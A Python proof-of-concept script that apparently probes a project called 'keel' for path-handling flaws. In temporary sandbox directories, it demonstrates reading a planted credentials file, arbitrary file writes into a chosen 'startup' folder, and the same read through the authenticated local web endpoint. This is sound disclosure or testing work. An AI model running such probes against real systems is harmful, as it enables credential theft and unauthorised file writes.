import http.client
import json
import sys
import tempfile
import threading
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent / "int" / "keel" / "src"))

from keel import backend_workflows as bw
from keel import webapp

root = Path(tempfile.mkdtemp(prefix="probe-paths-"))
secret_dir = root / "victim"
secret_dir.mkdir()
secret_file = secret_dir / "credentials.txt"
secret_file.write_text("API_KEY=supersecret123\n", encoding="utf-8")

# 1. Caller picks project_root=secret_dir, default permission rules, default
#    provider: read_file is permitted and the content is returned/persisted.
res = bw.run_request_workflow({
    "state_root": str(root / "state"),
    "project_root": str(secret_dir),
    "file_path": str(secret_file),
    "query": "credentials",
})
print("REQUEST ok:", res["ok"], "decision:",
      res["result"].get("permission", {}).get("permission_decision", {}).get("decision"))
print("content leaked:", repr(res["result"].get("tool", {}).get("content")))
ledger = root / "state" / "backend-workflows" / "request-results.jsonl"
print("content in ledger:", "supersecret123" in ledger.read_text(encoding="utf-8"))

# 2. Caller picks an arbitrary folder for the recovery workflow: arbitrary
#    file write with arbitrary content.
target_dir = root / "startup"
target_dir.mkdir()
res2 = bw.run_recovery_workflow({
    "state_root": str(root / "state2"),
    "folder": str(target_dir),
    "content": "PERSISTED-BY-WORKFLOW",
})
print("RECOVERY ok:", res2["ok"], "workspace:", res2["result"].get("workspace"))
print("marker written:", (target_dir / "recovery-note.md").read_text(encoding="utf-8"))

# 3. Same through the authenticated webapp endpoint using a state_root outside
#    the server workdir.
srv = webapp.make_server(0)
t = threading.Thread(target=srv.serve_forever, daemon=True)
t.start()
body = json.dumps({
    "confirm": True,
    "params": {
        "state_root": str(root / "webstate"),
        "project_root": str(secret_dir),
        "file_path": str(secret_file),
        "query": "credentials",
    },
}).encode()
conn = http.client.HTTPConnection("127.0.0.1", srv.server_address[1], timeout=30)
conn.request("POST", "/api/backend-workflows/request", body=body,
             headers={"Content-Type": "application/json",
                      "X-Keel-Token": webapp.token()})
r = conn.getresponse()
payload = json.loads(r.read().decode())
conn.close()
print("WEBAPP status:", r.status, "ok:", payload.get("ok"),
      "content:", repr(payload.get("result", {}).get("tool", {}).get("content")))
srv.shutdown(); srv.server_close(); t.join(timeout=5)
